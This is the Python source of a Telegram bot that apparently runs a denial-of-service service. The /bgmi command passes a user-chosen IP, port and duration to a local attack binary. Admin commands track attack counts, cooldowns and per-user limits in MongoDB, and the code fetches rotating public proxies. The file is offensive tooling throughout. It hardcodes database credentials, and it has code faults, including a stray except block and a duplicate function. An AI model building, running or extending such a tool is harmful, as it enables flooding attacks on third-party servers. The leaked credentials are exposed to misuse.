import logging
import subprocess
import asyncio
import itertools
import requests
import os
import time
import signal
import sys
from pymongo import MongoClient
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, GROUP_ID, GROUP_LINK, DEFAULT_THREADS




# Proxy-related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'
proxy_iterator = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        logging.error(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
        if proxy_iterator is None:  # If proxies are not available
            return None
    return next(proxy_iterator, None)

# Global variables
user_processes = {}
active_attack = False  # Track if an attack is in progress
MAX_DURATION = 240  # Default max attack duration in seconds
user_durations = {}  # Dictionary to store max durations for specific users
# Global variable to store user attack counts
user_attack_counts = {}
# Global variable to store user cooldowns
user_cooldowns = {}


# MongoDB configuration
MONGO_URI = "mongodb+srv://titanop24:titanop24@cluster0.qbdl8.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"  # Example: mongodb+srv://username:password@cluster.mongodb.net/
DATABASE_NAME = "titanop24"

# Connect to MongoDB
client = MongoClient(MONGO_URI)
db = client[DATABASE_NAME]

# MongoDB collections
users_collection = db["users"]
attacks_collection = db["attacks"]
logs_collection = db["logs"]

# File paths
USERS_FILE = "users.txt"
LOGS_FILE = "logs.txt"
ATTACKS_FILE = "attacks.txt"
DURATION_FILE = "duration.txt"

# Save all .txt data to MongoDB
def save_data_to_mongo():
    try:
        # Save Users
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r") as f:
                users = [{"user_id": line.split(",")[0], "username": line.split(",")[1].strip()} for line in f]
                users_collection.delete_many({})  # Clear existing data
                if users: users_collection.insert_many(users)
        
        # Save Attack Counts
        if os.path.exists(ATTACKS_FILE):
            with open(ATTACKS_FILE, "r") as f:
                attacks = [{"user_id": line.split(",")[0], "attack_count": int(line.split(",")[1].strip())} for line in f]
                attacks_collection.delete_many({})
                if attacks: attacks_collection.insert_many(attacks)
        
        # Save Logs
        if os.path.exists(LOGS_FILE):
            with open(LOGS_FILE, "r") as f:
                logs = [{"log": line.strip()} for line in f]
                logs_collection.delete_many({})
                if logs: logs_collection.insert_many(logs)
    except Exception as e:
        logging.error(f"Error saving data to MongoDB: {str(e)}")

        if os.path.exists(DURATION_FILE):
            with open(DURATION_FILE, "r") as f:
                durations = [{"user_id": line.split(",")[0], "max_duration": int(line.split(",")[1])} for line in f]
                db["durations"].delete_many({})  # Clear previous data
                if durations:
                    db["durations"].insert_many(durations)
    except Exception as e:
        logging.error(f"Error saving durations to MongoDB: {str(e)}")

        

# Fetch all data from MongoDB and save back to .txt
def fetch_data_from_mongo():
    try:
        # Fetch all necessary data
        # Fetch Users
        
        users = users_collection.find()
        with open(USERS_FILE, "w") as f:
            for user in users:
                f.write(f"{user.get('user_id')},{user.get('username')}\n")

        # Fetch Attack Counts
        attacks = attacks_collection.find()
        with open(ATTACKS_FILE, "w") as f:
            for attack in attacks:
                f.write(f"{attack.get('user_id')},{attack.get('attack_count')}\n")

        # Fetch Logs
        logs = logs_collection.find()
        '''print("Logs from MongoDB:")
        for log in logs:
            print(log)
    except Exception as e:
            print("Error fetching logs:", e)'''


    except Exception as e:
        logging.error(f"Error fetching data from MongoDB: {str(e)}")



# Call fetch_data_from_mongo() at bot startup
fetch_data_from_mongo()

def fetch_user_durations():
    try:
        # Fetch User Durations
        durations = db["durations"].find()
        global user_durations
        user_durations = {int(d["user_id"]): d["max_duration"] for d in durations}
        
       # print("User durations loaded from MongoDB:", user_durations)  # Debug line

    except Exception as e:
        logging.error(f"Error fetching user durations from MongoDB: {str(e)}")

fetch_user_durations()

# Ensure commands are executed in the correct group
async def ensure_correct_group(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if update.effective_chat.id != GROUP_ID:
        await update.message.reply_text(f"❌ 𝐭𝐡𝐢ꜱ 𝐛𝐨𝐭 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮ꜱ𝐞𝐝 𝐢𝐧 𝐚 ꜱ𝐩𝐞𝐜𝐢𝐟𝐢𝐜 𝐠𝐫𝐨𝐮𝐩. 𝐣𝐨𝐢𝐧 𝐡𝐞𝐫𝐞:- {GROUP_LINK}")
        return False
    return True

# Read users from file
def read_users():
    try:
        if not os.path.exists(USERS_FILE):
            return []
        with open(USERS_FILE, "r") as f:
            users = []
            for line in f:
                parts = line.strip().split(",")
                if len(parts) == 2:
                    users.append(parts)
            return users
    except Exception as e:
        logging.error(f"Error reading users file: {str(e)}")
        return []

async def save_user_info(user_id, username):
    try:
        # Save to users.txt (File-based storage)
        existing_users = {}
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r") as f:
                for line in f:
                    parts = line.strip().split(",")
                    if len(parts) == 2:
                        uid, uname = parts
                        existing_users[uid] = uname

        if str(user_id) not in existing_users:
            with open(USERS_FILE, "a") as f:
                f.write(f"{user_id},{username}\n")

        # Save to MongoDB
        users_collection.update_one(
            {"user_id": str(user_id)},
            {"$set": {"user_id": str(user_id), "username": username}},
            upsert=True
        )
    except Exception as e:
        logging.error(f"Error saving user info: {str(e)}")





def load_attack_counts():
    global user_attack_counts
    if os.path.exists(ATTACKS_FILE):
        try:
            with open(ATTACKS_FILE, "r") as f:
                for line in f:
                    uid, count = line.strip().split(",")
                    user_attack_counts[int(uid)] = int(count)
        except Exception as e:
            logging.error(f"Error loading attack counts: {str(e)}")

def save_attack_counts():
    try:
        with open(ATTACKS_FILE, "w") as f:
            for uid, count in user_attack_counts.items():
                f.write(f"{uid},{count}\n")
    except Exception as e:
        logging.error(f"Error saving attack counts: {str(e)}")

# Save attack logs
async def save_attack_log(user_id, target_ip, port, duration):
    global user_attack_counts
    try:
        # Save to logs.txt
        with open(LOGS_FILE, "a") as f:
            f.write(f"User: {user_id}, Target: {target_ip}:{port}, Duration: {duration}s\n")
        
        # Save attack counts
        if user_id in user_attack_counts:
            user_attack_counts[user_id] += 1
        else:
            user_attack_counts[user_id] = 1

        # Save to MongoDB
        logs_collection.insert_one({
            "user_id": str(user_id),
            "target_ip": target_ip,
            "port": port,
            "duration": duration,
            "timestamp": time.time(),
            "log": f"User: {user_id}, Target: {target_ip}:{port}, Duration: {duration}s"
        })
    except Exception as e:
        logging.error(f"Error saving attack log: {str(e)}")




# Updated attacks command (Admin-only)
async def attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
        return

    try:
        attacks = attacks_collection.find()
        report_lines = []
        grand_total = 0

        for attack in attacks:
            uid = attack.get('user_id', 'Unknown')
            attack_count = attack.get('attack_count', 0)
            grand_total += attack_count

            # Fetch user information from MongoDB
            user = users_collection.find_one({"user_id": uid})
            username = f"@{user['username']}" if user and user.get('username') else "Unknown"
            name = "Unknown"

            # Attempt to get the user's full name from Telegram API if available
            try:
                chat = await context.bot.get_chat(uid)
                name = f"{chat.first_name or ''} {chat.last_name or ''}".strip()
            except Exception:
                pass  # If fetching chat fails, default to "Unknown"

            # Format the report entry
            report_lines.append(
                f"𝗨𝗜𝗗:-   {uid}, \n𝗡𝗔𝗠𝗘​:-   {name}, \n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘​:-   {username}, \n𝗔𝗧𝗧𝗔𝗖𝗞𝗦​:-   {attack_count}\n **************************"
            )

        report_lines.append(f"\n👥 ​𝗧𝗢𝗧𝗔𝗟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦​:- {grand_total}")

        if report_lines:
            await update.message.reply_text("\n".join(report_lines))
        else:
            await update.message.reply_text("⚠️ 𝐍𝐨 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐚𝐭𝐚 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐟𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐚𝐭𝐚: {str(e)}")




async def start_attack(target_ip, port, duration, user_id, original_message, context):
    global active_attack
    command = ['./xxxx', target_ip, str(port), str(duration)]

    try:
        process = await asyncio.create_subprocess_exec(*command)
        if not process:
            active_attack = False
            return  # Silently exit if subprocess creation fails

        user_processes[user_id] = {
            "process": process,
            "target_ip": target_ip,
            "port": port,
            "duration": duration
        }

        await asyncio.wait_for(process.wait(), timeout=duration)

        del user_processes[user_id]
        try:
            await original_message.reply_text(f"🛑 𝐚𝐭𝐭𝐚𝐜𝐤 𝐟𝐢𝐧𝐢𝐬𝐡𝐞𝐝 𝐨𝐧​ 🛑\n 𝐇𝐎𝐒𝐓===>  {target_ip}\n𝐏𝐎𝐑𝐓===>  {port}\n𝐓𝐈𝐌𝐄===>  {duration}")
        except Exception:
            pass  # Silently ignore errors when sending the reply

    except asyncio.TimeoutError:
        if process and process.returncode is None:
            process.terminate()
            await process.wait()
        if user_id in user_processes:
            del user_processes[user_id]
        await context.bot.send_message(
            chat_id=GROUP_ID,
            text=f"⚠️ 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐞𝐫𝐦𝐢𝐧𝐚𝐭𝐞𝐝 𝐝𝐮𝐞 𝐭𝐨 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐥𝐢𝐦𝐢𝐭 𝐨𝐧 {target_ip}:{port}."
        )

    except Exception as e:
        logging.error(f"Attack error: {e}")
        if user_id in user_processes:
            del user_processes[user_id]

    finally:
        # Ensure the attack status is reset
        active_attack = False


# Start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    await update.message.reply_text("👋 𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐭𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤 𝐛𝐨𝐭!\n 𝐮𝐬𝐞 /𝐛𝐠𝐦𝐢 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞> 𝐭𝐨 𝐬𝐭𝐚𝐫𝐭 𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤")

# BGMI command handler
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global active_attack
    if not await ensure_correct_group(update, context):
        return

    user = update.message.from_user
    user_id = user.id
    username = user.username or "Unknown"

    await save_user_info(user_id, username)

    current_time = time.time()
    cooldown_time = 600  # Cooldown period in seconds (10 minutes)

    # Check if an attack is already in progress
    if active_attack or user_processes:
        await update.message.reply_text(
            "🚫 𝐀𝐧 𝐚𝐭𝐭𝐚𝐜𝐤 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐢𝐧 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐟𝐨𝐫 𝐢𝐭 𝐭𝐨 𝐟𝐢𝐧𝐢𝐬𝐡."
        )
        return

    # Check user cooldown
    if user_id in user_cooldowns:
        time_since_last_attack = current_time - user_cooldowns[user_id]
        if time_since_last_attack < cooldown_time:
            remaining_time = int(cooldown_time - time_since_last_attack)
            await update.message.reply_text(f"⏳ 𝐘𝐨𝐮 𝐦𝐮𝐬𝐭 𝐰𝐚𝐢𝐭 {remaining_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐛𝐞𝐟𝐨𝐫𝐞 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐚𝐧𝐨𝐭𝐡𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤.")
            return

    # Parse arguments
    if len(context.args) != 3:
        await update.message.reply_text("🛡️ 𝐔𝐬𝐞 /𝐛𝐠𝐦𝐢 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞> 𝐭𝐨 𝐬𝐭𝐚𝐫𝐭 𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤.")
        return

    target_ip = context.args[0]
    try:
        port = int(context.args[1])
        duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text("⚠️ 𝐏𝐨𝐫𝐭 𝐚𝐧𝐝 𝐭𝐢𝐦𝐞 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐢𝐧𝐭𝐞𝐠𝐞𝐫𝐬.")
        return

    # Enforce max duration for the user
    max_duration = user_durations.get(user_id, MAX_DURATION)  # Default if not set
    if duration > max_duration:
        duration = max_duration
        await update.message.reply_text(f"⚠️ 𝐌𝐚𝐱 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐟𝐨𝐫 𝐲𝐨𝐮 𝐢𝐬 {max_duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.")

    # Update cooldown
    user_cooldowns[user_id] = current_time
    active_attack = True

    # Save the attack log and increment the attack count
    await save_attack_log(user_id, target_ip, port, duration)

    # Update attacks_collection in MongoDB
    attacks_collection.update_one(
        {"user_id": str(user_id)},
        {"$inc": {"attack_count": 1}},  # Increment attack count
        upsert=True
    )

    # Start attack
     # Start attack
    attack_message = await update.message.reply_text(
        f"🚀 𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐧 \n𝐇𝐎𝐒𝐓===> {target_ip}\n𝐏𝐎𝐑𝐓===> {port}\n𝐓𝐈𝐌𝐄===> {duration}\n𝐔𝐒𝐄𝐑===> {username}"
    )

    asyncio.create_task(start_attack(target_ip, port, duration, user_id, attack_message, context))



# Set max duration command (Admin-only)
async def set_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
        return

    if len(context.args) != 2:
        await update.message.reply_text("🛡️ 𝐮𝐬𝐚𝐠𝐞: /𝐬𝐞𝐭 <𝐮𝐢𝐝/𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞> <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧>")
        return

    try:
        target = context.args[0]
        duration = int(context.args[1])

        target_user_id = None
        if target.isdigit():
            target_user_id = int(target)
        else:
            # Find user ID by username
            for uid, uname in read_users():
                if uname == target:
                    target_user_id = int(uid)
                    break

        if target_user_id is None:
            await update.message.reply_text("⚠️ 𝐮𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.")
            return

        # Update duration in the dictionary
        user_durations[target_user_id] = duration

        # Save to MongoDB
        db["durations"].update_one(
            {"user_id": str(target_user_id)},
            {"$set": {"user_id": str(target_user_id), "max_duration": duration}},
            upsert=True
        )

        await update.message.reply_text(f"✅ 𝐦𝐚𝐱 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐬𝐞𝐭 𝐭𝐨 {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐟𝐨𝐫 {target}.")
    except ValueError:
        await update.message.reply_text("⚠️ 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚𝐧 𝐢𝐧𝐭𝐞𝐠𝐞𝐫.")

# Duration command to show users with max duration < 240
async def duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
        return

    try:
        durations = db["durations"].find()
        report_lines = []

        if durations:
            for duration in durations:
                if duration is None:
                    continue
                uid = duration['user_id']
                max_duration = duration.get('max_duration', 240)
                
                # Fetch user details
                user = users_collection.find_one({"user_id": uid})
                
                if user:
                    username = f"@{user.get('username', 'Unknown')}"
                    display_name = user.get('display_name', user.get('username', 'Unknown'))

                    report_lines.append(
                        f"𝗨𝗜𝗗:-   {uid}, \n𝗡𝗔𝗠𝗘​:-   {display_name}, \n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘​:-   {username}, \n𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡​:-   {max_duration}s\n **************************"
                    )

            if report_lines:
                await update.message.reply_text("\n".join(report_lines))
            else:
                await update.message.reply_text("⚠️ 𝐍𝐨 𝐮𝐬𝐞𝐫𝐬 𝐰𝐢𝐭𝐡 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐥𝐞𝐬𝐬 𝐭𝐡𝐚𝐧 𝟐𝟒𝟎.")
        else:
            await update.message.reply_text("⚠️ 𝐍𝐨 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧𝐬 𝐟𝐨𝐮𝐧𝐝.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐟𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧𝐬: {str(e)}")





# Clear duration command to reset a specific user's duration
async def clear_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
        return

    if len(context.args) != 1:
        await update.message.reply_text("🛡️ 𝐔𝐬𝐚𝐠𝐞: /𝐜𝐥𝐞𝐚𝐫_𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 <𝐮𝐬𝐞𝐫_𝐢𝐝>")
        return

    target_user_id = context.args[0]

    try:
        # Reset max duration for the specified user
        db["durations"].update_one(
            {"user_id": target_user_id},
            {"$set": {"max_duration": 240}},
            upsert=True
        )

        await update.message.reply_text(f"✅ 𝐌𝐚𝐱 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐫𝐞𝐬𝐞𝐭 𝐭𝐨 𝟐𝟒𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐟𝐨𝐫 𝐮𝐬𝐞𝐫 𝐈𝐃: {target_user_id}.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐫𝐞𝐬𝐞𝐭𝐭𝐢𝐧𝐠 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {str(e)}")


# Clear logs command (Admin-only)
async def clear_logs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
        return

    count = logs_collection.count_documents({})
    logs_collection.delete_many({})
    await update.message.reply_text(f"✅ 𝐋𝐨𝐠𝐬 𝐜𝐥𝐞𝐚𝐫𝐞𝐝. 𝐓𝐨𝐭𝐚𝐥 𝐥𝐨𝐠𝐬 𝐝𝐞𝐥𝐞𝐭𝐞𝐝: {count}.")

# Clear users command (Admin-only)
async def clear_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
        return

    count = users_collection.count_documents({})
    users_collection.delete_many({})
    await update.message.reply_text(f"✅ 𝐔𝐬𝐞𝐫𝐬 𝐜𝐥𝐞𝐚𝐫𝐞𝐝. 𝐓𝐨𝐭𝐚𝐥 𝐮𝐬𝐞𝐫𝐬 𝐝𝐞𝐥𝐞𝐭𝐞𝐝: {count}.")

# Clear attacks command (Admin-only)
async def clear_attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
        return

    count = attacks_collection.count_documents({})
    attacks_collection.delete_many({})
    await update.message.reply_text(f"✅ 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 𝐜𝐥𝐞𝐚𝐫𝐞𝐝. 𝐓𝐨𝐭𝐚𝐥 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐝𝐞𝐥𝐞𝐭𝐞𝐝: {count}.")


# View logs command (Admin-only)
# Updated logs command (Admin-only)
async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
        return

    try:
        logs = logs_collection.find()
        log_entries = [log['log'] for log in logs]
        if log_entries:
            await update.message.reply_text(f"📊 Logs:\n" + "\n".join(log_entries))
        else:
            await update.message.reply_text("⚠️ 𝐍𝐨 𝐥𝐨𝐠𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐟𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐥𝐨𝐠𝐬: {str(e)}")



# View users command (Admin-only)
# Updated users command (Admin-only)
async def users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
        return

    try:
        users = users_collection.find()
        user_entries = [f"ID: {user['user_id']}, Username: {user['username']}" for user in users]
        if user_entries:
            await update.message.reply_text(f"👥 Users:\n" + "\n".join(user_entries))
        else:
            await update.message.reply_text("⚠️ 𝐍𝐨 𝐮𝐬𝐞𝐫𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐟𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐮𝐬𝐞𝐫𝐬: {str(e)}")


# Updated attacks command (Admin-only)
async def attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨ꜱ𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
        return

    # Fetch attack data from MongoDB
    global user_attack_counts
    user_attack_counts = {}
    attacks = attacks_collection.find()
    for attack in attacks:
        user_attack_counts[int(attack['user_id'])] = attack['attack_count']

    # Prepare attack report
    report_lines = []
    grand_total = 0

    for uid, count in user_attack_counts.items():
        username = "Unknown"
        display_name = "Unknown"

        # Find user info
        for u_id, u_name in read_users():
            if int(u_id) == uid:
                username = u_name
                user = await context.bot.get_chat(uid)
                display_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
                break

        report_lines.append(
            f"𝗨𝗜𝗗:-   {uid}, \n𝗡𝗔𝗠𝗘​:-   {display_name}, \n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘​:-   @{username}, \n𝗔𝗧𝗧𝗔𝗖𝗞𝗦​:-   {count}\n **************************"
        )
        grand_total += count

    report_lines.append(f"\n👥 ​𝗧𝗢𝗧𝗔𝗟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦​:- {grand_total}")

    if report_lines:
        await update.message.reply_text("\n".join(report_lines))
    else:
        await update.message.reply_text("⚠️ 𝐧𝐨 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐚𝐭𝐚 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")




def handle_exit(sig, frame):
    logging.info("Saving data to MongoDB before shutting down...")
    save_data_to_mongo()
    sys.exit(0)

# Handle termination signals
signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTERM, handle_exit)

# Main application setup
if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("set", set_duration))
    app.add_handler(CommandHandler("logs", logs))
    app.add_handler(CommandHandler("users", users))
    app.add_handler(CommandHandler("attacks", attacks)) 
    app.add_handler(CommandHandler("clear_logs", clear_logs))
    app.add_handler(CommandHandler("clear_users", clear_users))
    app.add_handler(CommandHandler("clear_attacks", clear_attacks))
    app.add_handler(CommandHandler("duration", duration))
    app.add_handler(CommandHandler("clear_duration", clear_duration))

    app.run_polling()
